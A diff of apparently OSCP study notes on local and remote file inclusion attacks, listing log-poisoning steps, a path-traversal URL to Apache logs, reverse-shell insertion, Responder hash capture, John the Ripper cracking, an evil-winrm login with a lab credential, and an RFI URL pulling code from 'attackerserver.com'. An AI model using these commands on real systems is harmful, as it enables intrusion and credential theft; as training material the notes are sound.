@@ -23,9 +23,13 @@
 9. Connect to `nc -nv $IP port`.Insert commandline exeuction payload (This depends on what techonology it is using. php ..etc)
 10. Check for sucessful log poisioning `../../../../var/log/apache2/access.log&cmd=id`.
 11. If you receive command execution, we will insert a reversshell via url encoding. Done. (wrapped and url encode)
-12. Use responder to capture. `sudo python3 Responder.py -I tun0. inject file=//$MyIP/testShare in the url`. Use john the ripper to match hash. 
-13. `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
-14. login to window .`evil-winrm -i 10.129.147.34 -u Administrator -p badminton`
+12. Create a reverse webshell (Check if RFI) is also possible
+13. Upload it 
+14. 
+15. methods 16-18 are not allowed in the OSCP.
+16. Use responder to capture. `sudo python3 Responder.py -I tun0. inject file=//$MyIP/testShare in the url`. Use john the ripper to match hash. 
+17. `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
+18. login to window .`evil-winrm -i 10.129.147.34 -u Administrator -p badminton`
 ## RFI
 1. Example Vulerable wesbites: `http://exampe.com/index.php?page=http://attackerserver.com/evil.txt`
 2. Host a server with python `python3 -m http.server 8080` with reverseshell code.
